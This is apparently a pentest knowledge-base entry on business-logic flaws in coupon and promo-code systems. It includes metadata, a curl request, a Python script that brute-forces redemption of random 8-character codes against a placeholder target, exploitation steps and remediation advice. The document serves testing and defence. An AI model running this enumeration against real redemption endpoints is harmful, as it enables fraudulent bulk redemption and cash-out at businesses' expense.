---
id: "coupon-code-enumeration"
title: "Enumerable coupon / bonus codes (bulk redemption and cash-out)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "high"
cvss: 8.3
severity-basis: "cvss"
severity-note: null
product: "Custom promotion/redemption-code system"
versions: "Any"
ports: "80, 443"
keywords: "coupon codes, bonuses, redemption, enumeration, coupon, claiming"
entry: "/api/coupon/redeem /api/promo/exchange"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
POST /api/coupon/redeem {"code":"ABCD1234"}
GET /api/promo/list
```

## Prerequisites

- A regular member; short or sequential codes (6-8 alphanumeric characters).

## PoC

```bash
# 1) Try your own code first and confirm response differences (success/already used/nonexistent)
curl -s -X POST https://target/api/coupon/redeem -H "Authorization: Bearer <t>" \
 -H 'Content-Type: application/json' -d '{"code":"AAAA0001"}'

# 2) Enumerate a small dictionary (rate-limit; start with 200 to demonstrate feasibility)
python3 - <<'PY'
import requests, random, string
t="https://target"; tk="<token>"
ok=[]
for _ in range(200):
 code=''.join(random.choices(string.ascii_uppercase+string.digits, k=8))
 r=requests.post(f"{t}/api/coupon/redeem", json={"code":code},
 headers={"Authorization":f"Bearer {tk}"}, timeout=5)
 if r.status_code==200 and '"code":0' in r.text: ok.append((code, r.text[:80]))
print(len(ok), ok[:3])
PY
# Result: successful redemption = confirmed (concurrency would be faster)
```

## Exploitation Steps

1. Inspect code rules first (length/character set/whether sequential);
2. Demonstrate enumeration with a small sample of 200 attempts; do not farm at scale;
3. After success, calculate the monetary value and clearly explain the risk of "bulk cash-out";
4. Evidence: a successful code + redemption response + balance change.

## Remediation and Mitigation

- Random codes of length ≥12 + single use + bound to promotion and user; count failed claims and rate-limit;
- Add behavioral risk controls to redemption endpoints (reject high-frequency requests from the same IP/device).

## References

- OWASP WSTG-BUSL-04; CWE-799.
